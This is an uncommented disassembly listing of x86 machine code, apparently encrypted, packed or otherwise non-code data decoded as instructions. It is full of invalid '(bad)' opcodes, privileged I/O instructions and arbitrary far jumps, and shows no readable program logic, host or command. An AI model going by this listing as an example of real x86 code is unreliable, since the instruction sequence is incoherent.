  41413a:	call   0x301a:0x2d504028
  414141:	sar    BYTE PTR [ecx+0x2f],cl
  414144:	jo     0x414137
  414146:	cmp    eax,edx
  414148:	ins    BYTE PTR es:[edi],dx
  414149:	(bad)  
  41414b:	shl    BYTE PTR [esi+ecx*4-0x10],0xcb
  414150:	test   DWORD PTR [eax-0x6c],0x486edd1f
  414157:	invd   
  414159:	jle    0x414165
  41415b:	aaa    
  41415c:	mov    ch,0xb3
  41415e:	push   cs
  41415f:	fcom   DWORD PTR [ebx+0x7d398f1]
  414165:	and    DWORD PTR [esi-0x275cd890],ecx
  41416b:	jg     0x4141b1
  41416d:	add    DWORD PTR [esi+0x63a81401],eax
  414173:	jb     0x414144
  414175:	pop    ss
  414176:	lods   al,BYTE PTR ds:[esi]
  414177:	gs mov cl,0xfa
  41417a:	enter  0x6e29,0xae
  41417e:	push   eax
  41417f:	inc    esp
  414180:	mov    ebx,DWORD PTR [ebx]
  414182:	sbb    cl,0x12
  414185:	and    BYTE PTR [ebp+0x64813133],dl
  41418b:	cdq    
  41418c:	idiv   esp
  41418e:	push   esp
  41418f:	ds pop es
  414191:	in     eax,dx
  414192:	add    al,0x9b
  414194:	or     eax,0xfe9053da
  414199:	xchg   BYTE PTR [ebx-0x7d0e3703],dl
  41419f:	cdq    
  4141a0:	fisttp QWORD PTR [ebx+0x78]
  4141a3:	pop    ebx
  4141a4:	shl    DWORD PTR [esi+ebp*4+0x14],1
  4141a8:	out    0xf1,eax
  4141aa:	push   ds
  4141ab:	xor    ebx,ecx
  4141ad:	ficomp DWORD PTR [ecx]
  4141af:	rcl    DWORD PTR [esi-0xf],0x8a
  4141b3:	jne    0x414149
  4141b5:	cmovae edi,DWORD PTR [edi+eiz*4]
  4141b9:	pop    ss
  4141ba:	and    esp,ebx
  4141bc:	in     al,dx
  4141bd:	into   
  4141be:	xchg   BYTE PTR [ecx+0x35],ah
  4141c1:	lahf   
  4141c2:	mov    bl,ch
  4141c4:	stc    
  4141c5:	adc    ch,BYTE PTR [ecx+0x28]
  4141c8:	jmp    0x8e4:0x9294b28
  4141cf:	out    0x65,eax
  4141d1:	jb     0x41422c
  4141d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141d4:	pop    ebp
  4141d5:	push   DWORD PTR [edx]
  4141d7:	sub    ch,BYTE PTR [edi]
  4141d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141da:	loopne 0x414247
  4141dc:	fdiv   DWORD PTR [edi]
  4141de:	loop   0x414169
  4141e0:	jmp    FWORD PTR [esi]
  4141e2:	repz out 0xa8,eax
  4141e5:	inc    ebp
  4141e6:	xchg   cl,dl
  4141e8:	pop    esp
  4141e9:	mov    ebx,es
  4141eb:	retf   
  4141ec:	pop    ebp
  4141ed:	adc    edi,edi
  4141ef:	sub    BYTE PTR [edi-0x7637ee25],dl
  4141f5:	lea    esi,[ebx-0x909a04e]
  4141fb:	dec    edx
  4141fc:	jnp    0x4141fd
  4141fe:	push   0x2a
  414200:	mov    ch,0x21
  414202:	stc    
  414203:	push   eax
  414204:	cmp    BYTE PTR [esp+edi*2],cl
  414207:	enter  0x1fc8,0x8f
  41420b:	cmc    
  41420c:	jne    0x41427f
  41420e:	push   edi
  41420f:	and    ebx,esi
  414211:	fwait
  414212:	and    eax,0x86aa2e22
  414217:	loope  0x4141cf
  414219:	jno    0x414285
  41421b:	mov    eax,0x29a4cd91
  414220:	sti    
  414221:	dec    esp
  414222:	inc    esp
  414223:	(bad)  
  414224:	or     DWORD PTR [esi],edi
  414226:	adc    BYTE PTR [ebx-0x2ebe65e1],bl
  41422c:	dec    eax
  41422d:	inc    DWORD PTR [esi+0x76]
  414230:	bound  ecx,QWORD PTR [esi+0x61]
  414233:	or     eax,0x694b73f6
  414238:	or     eax,esp
  41423a:	test   BYTE PTR [ecx-0x9cfcbae],0x96
  414241:	lock push es
  414243:	cld    
  414244:	and    cl,BYTE PTR gs:[edx-0x41f55050]
  41424b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41424c:	adc    eax,edi
  41424e:	test   BYTE PTR [ebx],dl
  414250:	rol    DWORD PTR [ebx],cl
  414252:	dec    edi
  414253:	cli    
  414254:	(bad)  
  414255:	icebp  
  414256:	inc    si
  414258:	gs jmp 0x9c342c06
  41425e:	(bad)  
  41425f:	add    eax,eax
  414261:	push   ebp
  414262:	xchg   edi,ebx
  414264:	and    al,0x70
  414266:	cmp    cl,0x41
  414269:	ins    DWORD PTR es:[edi],dx
  41426a:	jp     0x414294
  41426c:	push   edi
  41426d:	lahf   
  41426e:	hlt    
  41426f:	jl     0x414285
  414271:	mov    eax,0xf05ed9f7
  414276:	xlat   BYTE PTR ds:[ebx]
  414277:	(bad)  
  414278:	stos   DWORD PTR es:[edi],eax
  414279:	xor    ebp,DWORD PTR [eax+0x71ba412b]
  41427f:	sub    BYTE PTR [ebx],ah
  414281:	iret   
  414282:	daa    
  414283:	inc    ebp
  414284:	test   ebp,0x5ef93dba
  41428a:	fdivr  DWORD PTR [esi-0x14a5ea6e]
  414290:	mov    ch,0x85
  414292:	les    esp,FWORD PTR [edi]
  414294:	mov    al,0x10
  414296:	fadd   st,st(7)
  414298:	xchg   esi,eax
  414299:	dec    esi
  41429a:	mov    WORD PTR [ecx+0x2a],ss
  41429d:	pop    ebp
  41429e:	xchg   ecx,esi
  4142a0:	jg     0x41425a
  4142a2:	mov    eax,0x66b62709
  4142a7:	das    
  4142a8:	fistp  DWORD PTR [edi-0x7e]
  4142ab:	call   0x72b4:0x4c474548
  4142b2:	xchg   DWORD PTR [edi],ecx
  4142b4:	mov    eax,0xb64c1e7
  4142b9:	dec    edx
  4142ba:	mov    bl,0x29
  4142bc:	push   ebx
  4142bd:	mov    ds:0x1209dab2,eax
  4142c2:	out    0x8e,eax
  4142c4:	int    0xe6
  4142c6:	push   0x7c
  4142c8:	sbb    cl,dh
  4142ca:	mov    gs,edx
  4142cc:	fsub   st(7),st
  4142ce:	fidivr WORD PTR [ebx+0x69]
  4142d1:	(bad)  
  4142d2:	imul   ebx,DWORD PTR ds:0x89cf46e1,0xffffffff
  4142d9:	pop    eax
  4142da:	xchg   BYTE PTR [ecx],al
  4142dc:	out    0xf0,al
  4142de:	push   es
  4142df:	iret   
  4142e0:	mov    edi,0x6b9ef27e
  4142e5:	pop    ebp
  4142e6:	test   ch,dl
  4142e8:	or     ah,dl
  4142ea:	jle    0x4142fb
  4142ec:	adc    al,0xff
  4142ee:	xchg   ebx,eax
  4142ef:	adc    al,0xd5
  4142f1:	or     eax,0xb4c36569
  4142f6:	and    eax,0xef319228
  4142fb:	ror    BYTE PTR [eax],1
  4142fd:	mov    ch,BYTE PTR [ebx+0x5a]
  414300:	sub    BYTE PTR [ebx],cl
  414302:	pusha  
  414303:	ja     0x41434e
  414305:	out    dx,al
  414306:	in     al,dx
  414307:	add    eax,DWORD PTR [edi]
  414309:	adc    al,0x92
  41430b:	iret   
  41430c:	gs enter 0xf086,0x2e
  414311:	dec    BYTE PTR [ebx-0x2e648036]
  414317:	outs   dx,DWORD PTR ds:[esi]
  414318:	or     ch,dl
  41431a:	jmp    DWORD PTR [ecx-0x529dbf21]
  414320:	or     BYTE PTR [eax-0xf],bh
  414323:	jne    0x414346
  414325:	popf   
  414326:	repnz shl edi,cl
  414329:	icebp  
  41432a:	pop    esp
  41432b:	stos   BYTE PTR es:[edi],al
  41432c:	adc    DWORD PTR [edx+0x31],0xd59c9bff
  414333:	xor    al,0xcd
  414335:	jge    0x4142bd
  414337:	mov    cl,0xe4
  414339:	int3   
  41433a:	pusha  
  41433b:	pop    ecx
  41433c:	pop    esi
  41433d:	lock dec eax
  41433f:	(bad)  
  414340:	pop    ds
  414341:	xchg   ebx,eax
  414342:	es loope 0x4142f4
  414345:	inc    edx
  414346:	push   ss
  414347:	pop    ebp
  414348:	or     edx,DWORD PTR [esi+0x74]
  41434b:	(bad)  
  41434d:	bound  ebp,QWORD PTR [edx]
  41434f:	inc    ecx
  414350:	sti    
  414351:	lock and esi,DWORD PTR [eax+0x5e]
  414355:	jg     0x41438a
  414357:	mov    edi,0x6187ae56
  41435c:	push   ss
  41435d:	add    BYTE PTR ds:0x1f41e1c7,cl
  414363:	sub    DWORD PTR [ebx+edx*1+0x25f73451],esi
  41436a:	mov    dl,0x6f
  41436c:	mov    al,cl
  41436e:	in     eax,0xbb
  414370:	cmp    DWORD PTR [edi+0x74f713b0],ecx
  414376:	cmc    
  414377:	xor    ebp,ebx
  414379:	jecxz  0x4143d2
  41437b:	imul   ecx,DWORD PTR [ecx],0x1cdf846
  414381:	jae    0x414389
  414383:	outs   dx,BYTE PTR ds:[esi]
  414384:	aad    0xf0
  414386:	jmp    0xcc58:0xc7f67e38
  41438d:	cwde   
  41438e:	ror    ah,cl
  414390:	mov    DWORD PTR gs:[edi-0x5451597],eax
  414397:	rcr    BYTE PTR [ecx-0x6b],1
  41439a:	adc    BYTE PTR [ecx],ch
  41439c:	push   edx
  41439d:	cmp    al,0x98
  41439f:	scas   al,BYTE PTR es:[edi]
  4143a0:	or     DWORD PTR [eax+edi*8-0x581893a],ebp
  4143a7:	xchg   ebp,eax
  4143a8:	int3   
  4143a9:	lock aam 0x5
  4143ac:	mul    ecx
  4143ae:	aad    0xc2
  4143b0:	cwde   
  4143b1:	xchg   ebp,eax
  4143b2:	dec    eax
  4143b3:	mov    gs,esi
  4143b5:	push   0xefb18386
  4143ba:	push   ecx
  4143bb:	sbb    bh,BYTE PTR [edi+0xf26f3cb]
  4143c1:	push   eax
  4143c2:	jmp    FWORD PTR [edx]
  4143c4:	cmp    DWORD PTR [edx-0x33df6766],ebx
  4143ca:	xchg   DWORD PTR [ecx+0x42],esp
  4143cd:	in     eax,0x35
  4143cf:	lahf   
  4143d0:	inc    ecx
  4143d1:	lock or al,ah
  4143d4:	dec    ecx
  4143d5:	mov    BYTE PTR [ecx+0x2c628d1b],al
  4143db:	pushf  
  4143dc:	loop   0x4143d0
  4143de:	xchg   ecx,ebp
  4143e0:	jmp    0x406bfe55
  4143e5:	lock mov dl,0xbb
  4143e9:	xchg   edx,eax
  4143ea:	push   ebx
  4143eb:	mov    bh,0x39
  4143ed:	lods   eax,DWORD PTR ds:[esi]
  4143ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143ef:	xor    dh,BYTE PTR [edi+0x1e178754]
  4143f5:	mov    edi,0x3a4980ae
  4143fa:	sub    DWORD PTR ds:0x1ed9,ebp
  4143ff:	out    dx,eax
  414400:	div    DWORD PTR [ebp-0x6cddc528]
  414406:	push   0xffffffd6
  414408:	mov    edi,0xd7a45afe
  41440d:	pop    edx
  41440e:	shl    DWORD PTR [ecx-0x31],1
  414411:	in     al,dx
  414412:	dec    edx
  414413:	call   0xa1f35ec
  414418:	or     al,bh
  41441a:	push   edx
  41441b:	ss fcmovbe st,st(7)
  41441e:	adc    al,0xf7
  414420:	inc    eax
  414421:	lock pop edx
  414423:	add    eax,0x7075753
  414428:	pop    ds
  414429:	mov    ebp,0x801fd3ec
  41442e:	xchg   bh,ch
  414430:	inc    ebp
  414431:	sar    ebx,0x11
  414434:	inc    eax
  414435:	enter  0xd26a,0xf7
  414439:	mov    ?,ecx
  41443b:	scas   al,BYTE PTR es:[edi]
  41443c:	pop    edi
  41443d:	dec    ebp
  41443e:	xchg   DWORD PTR [ebx],ebx
  414440:	jae    0x414466
  414442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414443:	cmc    
  414444:	mov    ecx,0x1a8b8745
  414449:	imul   ecx,DWORD PTR [edi],0xd6e64b91
  41444f:	sub    DWORD PTR [eax-0x2e],edx
  414452:	lahf   
  414453:	sbb    DWORD PTR [ecx],ecx
  414455:	cmp    BYTE PTR [edx-0x32],bh
  414458:	and    ebp,ebx
  41445a:	cdq    
  41445b:	lds    edx,FWORD PTR [edx-0x71]
  41445e:	xor    ah,BYTE PTR [ecx+0xa]
  414461:	int    0xa6
  414463:	cli    
  414464:	push   esi
  414465:	xorps  xmm6,xmm6
  414468:	cmc    
  414469:	push   0x4b96963
  41446e:	xchg   ecx,esi
  414470:	mov    ds,WORD PTR [edx+0x28]
  414473:	adc    eax,0x29095393
  414478:	ja     0x4144c2
  41447a:	jg     0x414450
  41447c:	or     DWORD PTR [edi+esi*8-0x3d],edi
  414480:	enter  0xc240,0x39
  414484:	aad    0xf0
  414486:	cmp    BYTE PTR [edx],bl
  414488:	fwait
  414489:	enter  0x7c7d,0x87
  41448d:	sti    
  41448e:	inc    edx
  41448f:	into   
  414490:	pop    ebp
  414491:	sub    al,BYTE PTR [edi+0x1e5c0a1d]
  414497:	jae    0x414452
  414499:	daa    
  41449a:	jno    0x4144c4
  41449c:	clc    
  41449d:	inc    eax
  41449e:	(bad)  
  41449f:	mov    esi,0xc0f8ba2f
  4144a4:	pop    ds
  4144a5:	xchg   BYTE PTR [edi+0x31cdbab0],ch
  4144ab:	sub    DWORD PTR [ebp-0x10],esi
  4144ae:	push   es
  4144af:	push   ebx
  4144b0:	mov    bh,bh
  4144b2:	lock add ebp,ecx
  4144b5:	pop    ebx
  4144b6:	cmp    al,0x6b
  4144b8:	mov    al,ds:0x3a7bbe41
  4144bd:	jecxz  0x4144c5
  4144bf:	pop    esi
  4144c0:	push   ebx
  4144c1:	xchg   DWORD PTR [esi+0x581009ce],ebp
  4144c7:	nop
  4144c8:	imul   eax,DWORD PTR [edx+0x6808f1a1],0xffffff8e
  4144cf:	pop    ds
  4144d0:	fsubrp st(7),st
  4144d2:	pop    ds
  4144d3:	push   esp
  4144d4:	push   ebx
  4144d5:	lock add BYTE PTR [ebx+0x39f81ae3],dl
  4144dc:	mov    eax,0xb1bca5a1
  4144e1:	out    dx,al
  4144e2:	pop    edi
  4144e3:	lods   al,BYTE PTR ds:[esi]
  4144e4:	jg     0x41450a
  4144e6:	mov    eax,0x5cc24927
  4144eb:	test   al,0xb8
  4144ed:	mov    es,WORD PTR [eax]
  4144ef:	repnz or DWORD PTR [esi],edx
  4144f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144f3:	fld1   
  4144f5:	sbb    eax,0xe009eff8
  4144fa:	mov    ebx,0x6ee558fa
  4144ff:	or     al,0x66
  414501:	lock or ch,ch
  414504:	and    edx,DWORD PTR [ecx-0x3df4786b]
  41450a:	inc    esp
  41450b:	add    ebx,eax
  41450d:	sbb    al,0x87
  41450f:	cmc    
  414510:	shr    BYTE PTR [edx+0x644d18cd],1
  414516:	xor    BYTE PTR [edx],ch
  414518:	popf   
  414519:	xlat   BYTE PTR ds:[ebx]
  41451a:	ret    
  41451b:	mov    ds:0xd08ee06b,al
  414520:	xchg   bh,ah
  414522:	xchg   edi,ecx
  414524:	jb     0x414506
  414526:	jnp    0x4144b3
  414528:	jne    0x414533
  41452a:	cwde   
  41452b:	sub    bh,BYTE PTR [edx+0x3e]
  41452e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41452f:	mov    dl,0x53
  414531:	hlt    
  414532:	push   edi
  414533:	nop
  414534:	out    dx,al
  414535:	jns    0x4144bd
  414537:	fwait
  414538:	(bad)  
  414539:	(bad)  
  41453a:	jecxz  0x41452c
  41453c:	mov    edi,0x11487582
  414541:	addr16 inc edi
  414543:	push   ebx
  414544:	sub    al,0xfa
  414546:	xchg   DWORD PTR [edi+0x517e04ae],esi
  41454c:	cmp    dh,al
  41454e:	cmp    al,0x59
  414550:	xchg   ebp,eax
  414551:	mov    ecx,0x284932f7
  414556:	mov    eax,ds:0x9b9922bf
  41455b:	xor    eax,0xe1d21c3e
  414560:	add    al,0xa
  414562:	xchg   DWORD PTR [esi-0x29],ebp
  414565:	test   BYTE PTR [ecx],ah
  414567:	push   ebp
  414568:	sbb    DWORD PTR [esi+0x35a41287],ebx
  41456e:	sbb    eax,0x868cf3b8
  414573:	icebp  
  414574:	or     edi,DWORD PTR [eax-0x4a]
  414577:	je     0x414574
  414579:	repz mov dl,0x65
  41457c:	mov    bl,0xda
  41457e:	pop    esi
  41457f:	xor    eax,0x3ac7de7e
  414584:	or     BYTE PTR [edx],bl
  414586:	icebp  
  414587:	shl    al,1
  414589:	and    BYTE PTR ds:0x900da491,cl
  41458f:	mov    ss,WORD PTR [ecx-0x43d6c81f]
  414595:	inc    edx
  414596:	dec    ebp
  414597:	dec    edi
  414598:	or     BYTE PTR [esp+edi*4],ch
  41459b:	rcl    BYTE PTR [edx-0x31],cl
  41459e:	or     BYTE PTR [edx+0x33],bh
  4145a1:	nop
  4145a2:	ja     0x4145bf
  4145a4:	loope  0x41460b
  4145a6:	ja     0x4145bd
  4145a8:	js     0x41458d
  4145aa:	shr    DWORD PTR [eax-0x5bc6bd69],1
  4145b0:	and    al,0x94
  4145b2:	xchg   DWORD PTR [ebp+0x0],eax
  4145b5:	jecxz  0x414571
  4145b7:	jo     0x41461e
  4145b9:	fisub  DWORD PTR [edi-0x1e4371d8]
  4145bf:	push   es
  4145c0:	loopne 0x41455b
  4145c2:	ins    DWORD PTR es:[edi],dx
  4145c3:	and    eax,0x6787c2e0
  4145c8:	inc    esi
  4145c9:	aam    0xfb
  4145cb:	in     eax,0xe7
  4145cd:	cld    
  4145ce:	push   edx
  4145cf:	sub    DWORD PTR [esi],ebp
  4145d1:	in     al,0x96
  4145d3:	push   ecx
  4145d4:	jns    0x4145d5
  4145d6:	and    bh,al
  4145d8:	loop   0x414643
  4145da:	test   al,0x2d
  4145dc:	push   es
  4145dd:	dec    esp
  4145de:	stos   DWORD PTR es:[edi],eax
  4145df:	sbb    ebp,esp
  4145e1:	pop    ebx
  4145e2:	xchg   ecx,eax
  4145e3:	xor    al,0xe6
  4145e5:	daa    
  4145e6:	add    DWORD PTR [bp+di-0x5381],ebp
  4145eb:	adc    DWORD PTR [ebx],esi
  4145ed:	fcom   DWORD PTR [eax+0x29]
  4145f0:	mov    BYTE PTR [edi+0x3898fab5],ch
  4145f6:	add    BYTE PTR [eax-0x6b24559],bh
  4145fc:	and    esi,DWORD PTR [edx+0x2f]
  4145ff:	sub    DWORD PTR [esi],ecx
  414601:	xlat   BYTE PTR ds:[ebx]
  414602:	loop   0x414649
  414604:	neg    DWORD PTR [ebx-0x4bbec254]
  41460a:	retf   
  41460b:	mov    dl,0x90
  41460d:	jecxz  0x414675
  41460f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414610:	inc    ebp
  414611:	jb     0x41463d
  414613:	lock popf 
  414615:	cdq    
  414616:	xchg   ebx,esi
  414618:	or     esi,ecx
  41461a:	jns    0x414600
  41461c:	(bad)  
  41461d:	push   ds
  41461e:	inc    ecx
  41461f:	dec    edi
  414620:	stos   DWORD PTR es:[edi],eax
  414621:	in     al,dx
  414622:	loop   0x4145cd
  414624:	push   ds
  414625:	bnd jne 0x414656
  414628:	adc    eax,0xe48078e
  41462d:	mov    ah,0xeb
  41462f:	cmp    DWORD PTR [ecx],edi
  414631:	sbb    al,0x6
  414633:	add    DWORD PTR [ebx+0x3929cc47],0x44
  41463a:	cmc    
  41463b:	dec    edx
  41463c:	or     ebp,DWORD PTR [edx]
  41463e:	scas   al,BYTE PTR es:[edi]
  41463f:	xchg   ecx,eax
  414640:	dec    ebp
  414641:	pop    ecx
  414642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414643:	leave  
  414644:	enter  0x6b33,0x54
  414648:	sub    eax,0x875b7ea7
  41464d:	test   DWORD PTR [ecx+0xe7092db],ecx
  414653:	dec    eax
  414654:	or     BYTE PTR [edx],ah
  414656:	call   0x315252cc
  41465b:	ds mov eax,0x3fa5acf1
  414661:	jns    0x4146bb
  414663:	(bad)  
  414664:	fisttp WORD PTR [ecx+0x48fb0693]
  41466a:	xchg   BYTE PTR [ebp+0x4fb83663],ch
  414670:	leave  
  414671:	scas   eax,DWORD PTR es:[edi]
  414672:	cli    
  414673:	shl    DWORD PTR ds:0x16350495,cl
  414679:	mul    BYTE PTR [ecx+ebp*1+0x574712c2]
  414680:	mov    eax,0xf592c962
  414685:	es add al,0x28
  414688:	cmp    al,0x5
  41468a:	call   0xb28:0x116cf919
  414691:	jae    0x41463d
  414693:	into   
  414694:	push   es
  414695:	ficom  WORD PTR [edx-0x5a]
  414698:	lds    ebx,FWORD PTR [esi+0x4c35c8fb]
  41469e:	xchg   esi,edx
  4146a0:	adc    ecx,DWORD PTR [ebx+0x75]
  4146a3:	sub    BYTE PTR [edx],cl
  4146a5:	lea    esp,[edx+0xc]
  4146a8:	or     BYTE PTR [eax+0x465ba804],al
  4146ae:	xor    esi,DWORD PTR [eax+0x52]
  4146b1:	mul    BYTE PTR [esi+0x5bbb23f2]
  4146b7:	jns    0x414671
  4146b9:	xchg   ebx,eax
  4146ba:	ss in  eax,0xf
  4146bd:	push   esp
  4146be:	cli    
  4146bf:	std    
  4146c0:	mov    esi,0x469c798b
  4146c5:	sub    DWORD PTR [ebx],ebx
  4146c7:	jns    0x4146b6
  4146c9:	stos   DWORD PTR es:[edi],eax
  4146ca:	hlt    
  4146cb:	das    
  4146cc:	(bad)  
  4146ce:	(bad)  
  4146cf:	ins    BYTE PTR es:[edi],dx
  4146d0:	fcom   QWORD PTR [eax-0x7f060b09]
  4146d6:	xchg   BYTE PTR [ebx+0x663c2361],ch
  4146dc:	ins    DWORD PTR es:[edi],dx
  4146dd:	outs   dx,BYTE PTR ds:[esi]
  4146de:	inc    edx
  4146df:	sub    BYTE PTR [ebp+0xa700de3],ch
  4146e5:	dec    esp
  4146e6:	sub    esp,ebp
  4146e8:	inc    esp
  4146e9:	pop    esp
  4146ea:	cmp    eax,DWORD PTR [ecx-0x3f]
  4146ed:	mov    ebx,DWORD PTR [ebp+0x1fd7e99d]
  4146f3:	sub    BYTE PTR [eax],ah
  4146f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146f6:	xchg   ebx,eax
  4146f7:	mov    bh,0x71
  4146f9:	mov    al,ds:0x83c2fb91
  4146fe:	and    ah,BYTE PTR [edi]
  414700:	push   0x6c0c6a3c
  414705:	sub    eax,0xecf32521
  41470a:	icebp  
  41470b:	sub    BYTE PTR [eax+0x4f],ah
  41470e:	cmc    
  41470f:	push   esp
  414710:	or     esi,esi
  414712:	mov    al,bh
  414714:	out    dx,eax
  414715:	in     eax,0xbc
  414717:	sti    
  414718:	shl    cl,0x3a
  41471b:	fs cwde 
  41471d:	mov    ah,0x56
  41471f:	(bad)  
  414720:	adc    esp,ecx
  414722:	xlat   BYTE PTR ds:[ebx]
  414723:	xchg   ecx,eax
  414724:	pushw  0xff85
  414727:	xchg   ebp,eax
  414728:	xor    BYTE PTR [esi-0xe45d5e5],dh
  41472e:	push   ss
  41472f:	or     al,0x2c
  414731:	jl     0x414747
  414733:	movzx  ebx,WORD PTR [ebp+0x78]
  414737:	es push ss
  414739:	repz lock xor esp,esp
  41473d:	neg    BYTE PTR [ebx+0x547b98f7]
  414743:	mov    eax,0x297db593
  414748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414749:	(bad)  
  41474a:	cmp    ecx,ebp
  41474c:	or     DWORD PTR [esi-0x25],esp
  41474f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414750:	cdq    
  414751:	mov    ds:0x14df1350,al
  414756:	dec    edx
  414757:	or     al,BYTE PTR [ecx-0x14d68d6a]
  41475d:	sub    esi,DWORD PTR [edx]
  41475f:	sti    
  414760:	or     BYTE PTR [ecx+edi*2+0x30505d1e],ch
  414767:	mov    ecx,0xa3601fa1
  41476c:	sti    
  41476d:	cmp    BYTE PTR [ecx+ebp*1+0x7e],cl
  414771:	loopne 0x41477c
  414773:	retf   
  414774:	dec    eax
  414775:	stos   DWORD PTR es:[edi],eax
  414776:	pop    ebx
  414777:	(bad)  
  414778:	or     BYTE PTR [edx+0x3c],al
  41477b:	pop    ecx
  41477c:	jp     0x4147c1
  41477e:	fwait
  41477f:	pop    edi
  414780:	outs   dx,BYTE PTR ds:[esi]
  414781:	xor    bl,bh
  414783:	xchg   esp,eax
  414784:	xchg   ebp,eax
  414785:	push   es
  414786:	push   esi
  414787:	sub    BYTE PTR [ebp+ecx*4-0x6a],bl
  41478b:	sahf   
  41478c:	or     esi,edx
  41478e:	sub    eax,0x451fc4a3
  414793:	lock xor al,0xf1
  414796:	xchg   edx,eax
  414797:	sbb    DWORD PTR [ecx],ebx
  414799:	dec    ebx
  41479a:	icebp  
  41479b:	add    eax,0x6f904cff
  4147a0:	int    0xb3
  4147a2:	and    BYTE PTR [ecx],0xfc
  4147a5:	jo     0x41473e
  4147a7:	inc    edx
  4147a8:	cmp    eax,0xf5408c80
  4147ad:	stc    
  4147ae:	ficom  WORD PTR [ebx+0x79]
  4147b1:	sar    BYTE PTR [eax-0xd],0x27
  4147b5:	xor    eax,DWORD PTR [edx-0x58]
  4147b8:	or     BYTE PTR [ebx+edi*4+0xf],dl
  4147bc:	xchg   ebp,eax
  4147bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147be:	cmp    eax,0xf1104db3
  4147c3:	jns    0x4147a2
  4147c5:	pusha  
  4147c6:	or     al,0x30
  4147c8:	adc    ebp,edx
  4147ca:	fdivr  DWORD PTR [edi-0x20]
  4147cd:	cld    
  4147ce:	xchg   cl,ah
  4147d0:	or     al,dh
  4147d2:	enter  0x8f52,0x82
  4147d6:	in     eax,0x2b
  4147d8:	pop    ecx
  4147d9:	jbe    0x4147a9
  4147db:	dec    ecx
  4147dc:	mov    edi,esi
  4147de:	push   esi
  4147df:	xchg   esi,eax
  4147e0:	push   es
  4147e1:	sbb    al,0xc6
  4147e3:	push   ebp
  4147e4:	(bad)  
  4147e5:	mov    ebp,0xf0f9d0a7
  4147ea:	daa    
  4147eb:	outs   dx,BYTE PTR ds:[esi]
  4147ec:	sbb    DWORD PTR [ecx+ebp*2+0x29],ebx
  4147f0:	adc    BYTE PTR [ecx-0x1a],0x50
  4147f4:	or     eax,edx
  4147f6:	or     ebp,edx
  4147f8:	ds inc edx
  4147fa:	xchg   ebp,eax
  4147fb:	sbb    cl,bl
  4147fd:	adc    esp,DWORD PTR [eax]
  4147ff:	ins    DWORD PTR es:[edi],dx
  414800:	jnp    0x41483b
  414802:	sbb    DWORD PTR [ecx],ebp
  414804:	pop    ss
  414805:	fadd   st,st(1)
  414807:	daa    
  414808:	or     BYTE PTR [ebp+ecx*8-0x20],dh
  41480c:	dec    edx
  41480d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41480e:	add    eax,0xd6f0d1a5
  414813:	xchg   esi,eax
  414814:	add    BYTE PTR [ebx],al
  414816:	iret   
  414817:	xor    BYTE PTR cs:[edx],0x9e
  41481b:	inc    edi
  41481c:	xor    DWORD PTR [eax-0x5a],eax
  41481f:	inc    esp
  414820:	mov    BYTE PTR [ebx],dl
  414822:	sbb    eax,0x625a77d5
  414827:	inc    ebx
  414828:	std    
  414829:	aas    
  41482a:	jle    0x414855
  41482c:	mov    edi,0x36d77963
  414831:	pop    esp
  414832:	sbb    cl,BYTE PTR [esp+edx*4]
  414835:	(bad)  
  414836:	not    bl
  414838:	push   ecx
  414839:	(bad)  
  41483b:	call   0x1c502fde
  414840:	loopne 0x4147fa
  414842:	adc    BYTE PTR [ecx],cl
  414844:	les    ebp,FWORD PTR [edi+eax*4]
  414847:	inc    eax
  414848:	or     DWORD PTR [edx-0x77d791bb],ecx
  41484e:	fs mov bl,0xd0
  414851:	jns    0x4147da
  414853:	inc    esp
  414854:	push   ecx
  414855:	cmc    
  414856:	sub    DWORD PTR [esi],ebp
  414858:	outs   dx,DWORD PTR ds:[esi]
  414859:	clc    
  41485a:	mov    ds:0x8771fde0,al
  41485f:	xchg   esi,eax
  414860:	adc    DWORD PTR ds:0xa1beb386,edx
  414866:	push   cs
  414867:	leave  
  414868:	fnsave [edx-0x50b9d76e]
  41486e:	aas    
  41486f:	pand   mm4,QWORD PTR [ebx-0x63]
  414873:	aas    
  414874:	cmp    eax,ecx
  414876:	call   0xc869:0xe2fbd517
  41487d:	lock push 0xbdc73930
  414883:	daa    
  414884:	cli    
  414885:	dec    ebx
  414886:	mov    ds:0xdf0f77ac,eax
  41488b:	out    0x21,eax
  41488d:	jmp    0xbcbd:0x39001187
  414894:	dec    edi
  414895:	aad    0xa0
  414897:	sub    BYTE PTR [ebp+0x68],bl
  41489a:	pop    ebx
  41489b:	test   edi,esi
  41489d:	mov    eax,ds:0xe0a46c32
  4148a2:	sbb    al,0x9f
  4148a4:	push   es
  4148a5:	lock in al,0x76
  4148a8:	jmp    0xfc6e:0x6b8f373c
  4148af:	add    eax,DWORD PTR [ebx+0x57598675]
  4148b5:	mov    esi,0xabeb9760
  4148ba:	xor    eax,0x1483bc28
  4148bf:	pop    ds
  4148c0:	push   es
  4148c1:	jo     0x414938
  4148c3:	and    dh,BYTE PTR [eax-0x44]
  4148c6:	aad    0x86
  4148c8:	cmp    DWORD PTR [esi+0x232f3aa6],esi
  4148ce:	cli    
  4148cf:	push   esi
  4148d0:	push   ecx
  4148d1:	push   es
  4148d2:	test   BYTE PTR [ebp+eiz*1+0x71],bl
  4148d6:	mov    ebx,0xebf40e26
  4148db:	jmp    0x414881
  4148dd:	xchg   edx,eax
  4148de:	fs cld 
  4148e0:	pop    esi
  4148e1:	test   BYTE PTR [eax+0x5ea15a0a],dl
  4148e7:	sub    BYTE PTR [ebp+0x7a95deed],bh
  4148ed:	sub    DWORD PTR [edx-0x9],edi
  4148f0:	sbb    BYTE PTR [ebx-0x39],bh
  4148f3:	and    BYTE PTR [eax],0x8c
  4148f6:	and    edi,eax
  4148f8:	mov    dl,0xf1
  4148fa:	clc    
